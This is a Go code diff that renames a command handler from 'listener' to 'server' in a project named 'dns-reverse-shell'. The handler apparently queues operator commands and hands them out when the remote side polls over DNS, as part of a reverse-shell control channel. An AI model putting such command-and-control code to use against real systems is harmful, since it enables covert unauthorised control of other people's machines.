@@ -1,4 +1,4 @@
-package listener
+package server
 
 import (
 	"dns-reverse-shell/main/shell"
@@ -6,28 +6,28 @@ import (
 	"github.com/golang-collections/collections/queue"
 )
 
-type listenerCommandHandler struct {
+type serverCommandHandler struct {
 	shell           *shell.Shell
 	queue           *queue.Queue
 	timeoutExecutor *timeoutExecutor
 }
 
-func newListenerCommandHandler() *listenerCommandHandler {
-	handler := listenerCommandHandler{queue: queue.New()}
+func newServerCommandHandler() *serverCommandHandler {
+	handler := serverCommandHandler{queue: queue.New()}
 	handler.timeoutExecutor = newTimeoutExecutor()
 	return &handler
 }
 
-func (c *listenerCommandHandler) init() {
+func (c *serverCommandHandler) init() {
 	c.shell = shell.NewShell(c.queueCommand)
 	c.shell.Start()
 }
 
-func (c *listenerCommandHandler) queueCommand(command string) {
+func (c *serverCommandHandler) queueCommand(command string) {
 	c.queue.Enqueue(command)
 }
 
-func (c *listenerCommandHandler) HandleCommand(value string, pollCallback func(), answerCallback func(string), exitCallback func()) {
+func (c *serverCommandHandler) HandleCommand(value string, pollCallback func(), answerCallback func(string), exitCallback func()) {
 	c.resetTimeout(exitCallback)
 	switch value {
 	case "poll.":
@@ -48,26 +48,26 @@ func (c *listenerCommandHandler) HandleCommand(value string, pollCallback func()
 	}
 }
 
-func (c *listenerCommandHandler) Poll(pollCallback func()) {
+func (c *serverCommandHandler) Poll(pollCallback func()) {
 	pollCallback()
 }
 
-func (c *listenerCommandHandler) Answer(value string, answerCallback func(string)) {
+func (c *serverCommandHandler) Answer(value string, answerCallback func(string)) {
 	answerCallback(value)
 }
 
-func (c *listenerCommandHandler) Exit(exitCallback func()) {
+func (c *serverCommandHandler) Exit(exitCallback func()) {
 	exitCallback()
 	fmt.Println("Connection closed")
 	c.timeoutExecutor.exit()
 	c.shell.Start()
 }
 
-func (c *listenerCommandHandler) Default(defaultCallback func(string)) {
+func (c *serverCommandHandler) Default(defaultCallback func(string)) {
 	defaultCallback(c.queue.Dequeue().(string))
 }
 
-func (c *listenerCommandHandler) resetTimeout(exitCallback func()) {
+func (c *serverCommandHandler) resetTimeout(exitCallback func()) {
 	c.timeoutExecutor.reset()
 	if c.timeoutExecutor.callback != nil {
 		c.timeoutExecutor.callback = func() {
@@ -76,6 +76,6 @@ func (c *listenerCommandHandler) resetTimeout(exitCallback func()) {
 	}
 }
 
-func (c *listenerCommandHandler) initTimeout() {
+func (c *serverCommandHandler) initTimeout() {
 	go c.timeoutExecutor.start()
 }
